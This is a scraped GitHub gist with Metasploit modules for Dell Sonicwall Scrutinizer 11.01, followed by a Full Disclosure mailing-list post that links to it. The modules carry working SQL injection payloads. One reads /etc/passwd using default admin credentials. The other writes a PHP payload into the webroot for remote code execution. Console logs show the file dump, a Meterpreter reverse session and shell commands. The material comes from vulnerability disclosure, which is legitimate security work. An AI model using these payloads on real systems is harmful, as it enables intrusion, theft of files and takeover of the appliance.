|  | print\_good("Attempting to read file using 'admin' account: " + datastore['FILENAME']) |
|  |  |
|  | res = send\_request\_cgi({ |
|  | 'uri' => normalize\_uri(target\_uri, '/cgi-bin/login.cgi'), |
|  | 'vars\_get' => { |
|  | 'name' => 'admin', |
|  | 'pwd' => 'passw0rd!' |
|  | } |
|  | }) |
|  |  |
|  | res.body =~ /"userid":"(.\*)","sessionid":"(.\*)"/ |
|  | sessionid = $2 |
|  |  |
|  | cookie = "cookiesenabled=1; sessionid=#{sessionid}; userid=#{$1}" |
|  |  |
|  | hexstr = datastore['FILENAME'].bytes.map { |b| sprintf("%02x",b) }.join |
|  | i = 0 |
|  | file = '' |
|  | while true |
|  | post = { |
|  | 'tool' => 'userprefs', |
|  | 'newUser' => 'fdsafdsa', |
|  | 'pwd' => 'passw0rd!', |
|  | 'selectedUserGroup' => "2 AND (SELECT 3835 FROM(SELECT COUNT(\*),CONCAT(0x716b6b7171,(SELECT MID((IFNULL(CAST(HEX(LOAD\_FILE(0x#{hexstr})) AS CHAR),0x20)),#{(50\*i)+1},50)),0x717a7a7571,FLOOR(RAND(0)\*2))x FROM INFORMATION\_SCHEMA.CHARACTER\_SETS GROUP BY x)a)" |
|  | } |
|  |  |
|  | res = send\_request\_cgi({ |
|  | 'uri' => normalize\_uri(target\_uri, '/cgi-bin/admin.cgi'), |
|  | 'method' => 'POST', |
|  | 'vars\_post' => post, |
|  | 'cookie' => cookie |
|  | }) |
|  |  |
|  | res.body =~ /qkkqq(.\*)qzzuq1/ |
|  | break if $1 == '' |
|  | part = $1.scan(/(..)/).map{|a| a.first.to\_i(16).chr}.join |
|  | file << part |
|  | i+=1 |
|  | print\_good("#{i}. #{part}") |
|  | end |
|  |  |
|  | print\_good(file) |
|  | end |
|  | end |
|  | end |
|  |  |
|  | \_\_END\_\_ |
|  | msf auxiliary(scrutinizer\_password\_change) > show options |
|  |  |
|  | Module options (auxiliary/gather/scrutinizer\_password\_change): |
|  |  |
|  | Name Current Setting Required Description |
|  | ---- --------------- -------- ----------- |
|  | FILENAME /etc/passwd yes The file to read from the admin sqli |
|  | PASSWORD passw0rd! no The password to authenticate with |
|  | Proxies no Use a proxy chain |
|  | RHOST 192.168.1.99 yes The target address |
|  | RPORT 80 yes The target port |
|  | TARGETURI / yes Base Application path |
|  | USERID 1 yes The ID of the user to have their password changed. 'admin' is always 1. |
|  | USERNAME username no The username to authenticate as |
|  | VHOST no HTTP server virtual host |
|  |  |
|  | msf auxiliary(scrutinizer\_password\_change) > run |
|  |  |
|  | [+] Log in with the user's name and the password 'passw0rd!' |
|  | [+] Attempting to read file using 'admin' account: /etc/passwd |
|  | [+] 1. root:x:0:0:root:/root:/bi |
|  | [+] 2. n/bash |
|  | bin:x:1:1:bin:/bin |
|  | [+] 3. :/sbin/nologin |
|  | daemon:x:2 |
|  | [+] 4. :2:daemon:/sbin:/sbin/nol |
|  | [+] 5. ogin |
|  | adm:x:3:4:adm:/var/a |
|  | [+] 6. dm:/sbin/nologin |
|  | lp:x:4:7 |
|  | [+] 7. :lp:/var/spool/lpd:/sbin/ |
|  | [+] 8. nologin |
|  | sync:x:5:0:sync:/ |
|  | [+] 9. sbin:/bin/sync |
|  | shutdown:x |
|  | [+] 10. :6:0:shutdown:/sbin:/sbin |
|  | [+] 11. /shutdown |
|  | halt:x:7:0:halt |
|  | [+] 12. :/sbin:/sbin/halt |
|  | mail:x: |
|  | [+] 13. 8:12:mail:/var/spool/mail |
|  | [+] 14. :/sbin/nologin |
|  | uucp:x:10: |
|  | [+] 15. 14:uucp:/var/spool/uucp:/ |
|  | [+] 16. sbin/nologin |
|  | operator:x:1 |
|  | [+] 17. 1:0:operator:/root:/sbin/ |
|  | [+] 18. nologin |
|  | games:x:12:100:ga |
|  | [+] 19. mes:/usr/games:/sbin/nolo |
|  | [+] 20. gin |
|  | gopher:x:13:30:gopher |
|  | [+] 21. :/var/gopher:/sbin/nologi |
|  | [+] 22. n |
|  | ftp:x:14:50:FTP User:/v |
|  | [+] 23. ar/ftp:/sbin/nologin |
|  | nobo |
|  | [+] 24. dy:x:99:99:Nobody:/:/sbin |
|  | [+] 25. /nologin |
|  | vcsa:x:69:69:vir |
|  | [+] 26. tual console memory owner |
|  | [+] 27. :/dev:/sbin/nologin |
|  | rpc:x |
|  | [+] 28. :32:32:Rpcbind Daemon:/va |
|  | [+] 29. r/cache/rpcbind:/sbin/nol |
|  | [+] 30. ogin |
|  | rpcuser:x:29:29:RPC |
|  | [+] 31. Service User:/var/lib/nfs |
|  | [+] 32. :/sbin/nologin |
|  | nfsnobody: |
|  | [+] 33. x:65534:65534:Anonymous N |
|  | [+] 34. FS User:/var/lib/nfs:/sbi |
|  | [+] 35. n/nologin |
|  | sshd:x:74:74:Pr |
|  | [+] 36. ivilege-separated SSH:/va |
|  | [+] 37. r/empty/sshd:/sbin/nologi |
|  | [+] 38. n |
|  | plixer:x:500:500::/home |
|  | [+] 39. /plixer:/bin/bash |
|  | ntp:x:3 |
|  | [+] 40. 8:38::/etc/ntp:/sbin/nolo |
|  | [+] 41. gin |
|  | dbus:x:81:81:System m |
|  | [+] 42. essage bus:/:/sbin/nologi |
|  | [+] 43. n |
|  | haldaemon:x:68:68:HAL d |
|  | [+] 44. aemon:/:/sbin/nologin |
|  | apa |
|  | [+] 45. che:x:48:48:Apache:/var/w |
|  | [+] 46. ww:/sbin/nologin |
|  | rtkit:x: |
|  | [+] 47. 499:498:RealtimeKit:/proc |
|  | [+] 48. :/sbin/nologin |
|  | pulse:x:49 |
|  | [+] 49. 8:497:PulseAudio System D |
|  | [+] 50. aemon:/var/run/pulse:/sbi |
|  | [+] 51. n/nologin |
|  | mysql:x:27:27:M |
|  | [+] 52. ySQL Server:/var/lib/mysq |
|  | [+] 53. l:/bin/bash |
|  | tcpdump:x:72: |
|  | [+] 54. 72::/:/sbin/nologin |
|  |  |
|  | [+] root:x:0:0:root:/root:/bin/bash |
|  | bin:x:1:1:bin:/bin:/sbin/nologin |
|  | daemon:x:2:2:daemon:/sbin:/sbin/nologin |
|  | adm:x:3:4:adm:/var/adm:/sbin/nologin |
|  | lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin |
|  | sync:x:5:0:sync:/sbin:/bin/sync |
|  | shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown |
|  | halt:x:7:0:halt:/sbin:/sbin/halt |
|  | mail:x:8:12:mail:/var/spool/mail:/sbin/nologin |
|  | uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin |
|  | operator:x:11:0:operator:/root:/sbin/nologin |
|  | games:x:12:100:games:/usr/games:/sbin/nologin |
|  | gopher:x:13:30:gopher:/var/gopher:/sbin/nologin |
|  | ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin |
|  | nobody:x:99:99:Nobody:/:/sbin/nologin |
|  | vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin |
|  | rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin |
|  | rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin |
|  | nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin |
|  | sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin |
|  | plixer:x:500:500::/home/plixer:/bin/bash |
|  | ntp:x:38:38::/etc/ntp:/sbin/nologin |
|  | dbus:x:81:81:System message bus:/:/sbin/nologin |
|  | haldaemon:x:68:68:HAL daemon:/:/sbin/nologin |
|  | apache:x:48:48:Apache:/var/www:/sbin/nologin |
|  | rtkit:x:499:498:RealtimeKit:/proc:/sbin/nologin |
|  | pulse:x:498:497:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin |
|  | mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash |
|  | tcpdump:x:72:72::/:/sbin/nologin |
|  |  |
|  | [\*] Auxiliary module execution completed |
|  | msf auxiliary(scrutinizer\_password\_change) > |

 [Raw](/brandonprry/76741d9a0d4f518fe297/raw/8896d0808a0c65ceff9a5e1540c783c61af3131d/scrutinizer_xcnetworkdetail_sqli_exec.rb)

[**scrutinizer\_xcnetworkdetail\_sqli\_exec.rb**](#file-scrutinizer_xcnetworkdetail_sqli_exec-rb)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | # This module requires Metasploit: http//metasploit.com/download |
| --- | --- |
|  | ## |
|  | # Current source: https://github.com/rapid7/metasploit-framework |
|  | ## |
|  |  |
|  | require 'msf/core' |
|  |  |
|  | class Metasploit3 < Msf::Exploit::Remote |
|  | Rank = ExcellentRanking |
|  |  |
|  | include Msf::Exploit::Remote::HttpClient |
|  | include Msf::Exploit::FileDropper |
|  |  |
|  | def initialize(info={}) |
|  | super(update\_info(info, |
|  | 'Name' => "Dell Sonicwall Scrutinizer 11.01 Authenticated Code Execution", |
|  | 'Description' => %q{ |
|  | Dell Sonicwall Scrutinizer 11.01 is vulnerable to an authenticated SQL injection that allows |
|  | an attacker to write arbitrary files to the file system. This vulnerability is used |
|  | to write a PHP script to the file system to gain RCE. |
|  |  |
|  | This was tested on the Dell Scrutinizer appliance available to download on mysonicwall.com |
|  | }, |
|  | 'License' => MSF\_LICENSE, |
|  | 'Author' => [], |
|  | 'References' => [], |
|  | 'Platform' => ['php'], |
|  | 'Arch' => ARCH\_PHP, |
|  | 'Targets' => [['Dell Sonicwall Scrutinizer 11.01', {}],], |
|  | 'Privileged' => false, |
|  | 'DisclosureDate' => "", |
|  | 'DefaultTarget' => 0)) |
|  |  |
|  | register\_options( |
|  | [ |
|  | OptString.new('TARGETURI', [ true, "Base Application path", "/" ]), |
|  | OptString.new('USERNAME', [ false, "The username to authenticate as"]), |
|  | OptString.new('PASSWORD', [ false, "The password to authenticate with" ]) |
|  | ], self.class) |
|  | end |
|  |  |
|  | def exploit |
|  | res = send\_request\_cgi({ |
|  | 'uri' => normalize\_uri(target\_uri, '/cgi-bin/login.cgi'), |
|  | 'vars\_get' => { |
|  | 'name' => datastore['USERNAME'], |
|  | 'pwd' => datastore['PASSWORD'] |
|  | } |
|  | }) |
|  |  |
|  | res.body =~ /"userid":"(.\*)","sessionid":"(.\*)"/ |
|  | sessionid = $2 |
|  |  |
|  | cookie = "cookiesenabled=1;sessionid=#{sessionid};userid=#{$1}" |
|  |  |
|  | hexstr = ("<?php " + payload.encoded + " ?>").bytes.map { |b| sprintf("%02x",b) }.join |
|  |  |
|  | post = { |
|  | 'xcNetworkDetail' => "-7230 UNION ALL SELECT NULL,0x#{hexstr},NULL,NULL INTO DUMPFILE '/home/plixer/scrutinizer/html/d4d/#{sessionid}.php'#" |
|  | } |
|  |  |
|  | register\_files\_for\_cleanup("/home/plixer/scrutinizer/html/d4d/#{sessionid}.php") |
|  |  |
|  | send\_request\_cgi({ |
|  | 'uri' => normalize\_uri(target\_uri, '/d4d/exporters.php'), |
|  | 'vars\_get' => post, |
|  | 'cookie' => cookie |
|  | }) |
|  |  |
|  | send\_request\_cgi({ 'uri' => normalize\_uri(target\_uri, "/d4d/#{sessionid}.php")}) |
|  | end |
|  | end |
|  |  |
|  | \_\_END\_\_ |
|  | msf exploit(scrutinizer\_sqli\_exec) > show options |
|  |  |
|  | Module options (exploit/dell/scrutinizer/scrutinizer\_sqli\_exec): |
|  |  |
|  | Name Current Setting Required Description |
|  | ---- --------------- -------- ----------- |
|  | PASSWORD passw0rd! no The password to authenticate with |
|  | Proxies no Use a proxy chain |
|  | RHOST 192.168.1.99 yes The target address |
|  | RPORT 80 yes The target port |
|  | TARGETURI / yes Base Application path |
|  | USERNAME username no The username to authenticate as |
|  | VHOST no HTTP server virtual host |
|  |  |
|  |  |
|  | Exploit target: |
|  |  |
|  | Id Name |
|  | -- ---- |
|  | 0 Dell Sonicwall Scrutinizer 11.01 |
|  |  |
|  |  |
|  | msf exploit(scrutinizer\_sqli\_exec) > exploit |
|  |  |
|  | [\*] Started reverse handler on 192.168.1.31:4444 |
|  | [\*] Sending stage (39195 bytes) to 192.168.1.99 |
|  | [\*] Meterpreter session 1 opened (192.168.1.31:4444 -> 192.168.1.99:38133) at 2014-02-15 09:33:34 -0600 |
|  |  |
|  | meterpreter > shell |
|  | Process 3038 created. |
|  | Channel 0 created. |
|  | id |
|  | uid=48(apache) gid=48(apache) groups=48(apache),500(plixer) |
|  | uname -a |
|  | Linux fdsafdsafdsa 2.6.32-358.11.1.el6.x86\_64 #1 SMP Wed Jun 12 03:34:52 UTC 2013 x86\_64 x86\_64 x86\_64 GNU/Linux |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fbrandonprry%2F76741d9a0d4f518fe297)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from seclists.org_aa8327f0_20250124_205037.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](43)
[By Date](date.html#44)
[![Next](/images/right-icon-16x16.png)](45)

[![Previous](/images/left-icon-16x16.png)](43)
[By Thread](index.html#44)
[![Next](/images/right-icon-16x16.png)](46)

![](/shared/images/nst-icons.svg#search)

# Dell Scrutinizer 11.01 multiple vulnerabilities

---

*From*: Brandon Perry <bperry.volatile () gmail com>

*Date*: Thu, 10 Jul 2014 11:18:56 -0500

---

```
Hello!

The below gists detail at a high level[1] many SQL injection
vulnerabilities as well as a privilege escalation vulnerability and
corresponding Metasploit modules[2].

[1] <https://gist.github.com/brandonprry/36b4b8df1cde279a9305>
[2] <https://gist.github.com/brandonprry/76741d9a0d4f518fe297>

--
<http://volatile-minds.blogspot.com> -- blog
<http://www.volatileminds.net> -- website

_______________________________________________
Sent through the Full Disclosure mailing list
<http://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](43)
[By Date](date.html#44)
[![Next](/images/right-icon-16x16.png)](45)

[![Previous](/images/left-icon-16x16.png)](43)
[By Thread](index.html#44)
[![Next](/images/right-icon-16x16.png)](46)

### Current thread:

* **Dell Scrutinizer 11.01 multiple vulnerabilities** *Brandon Perry (Jul 10)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


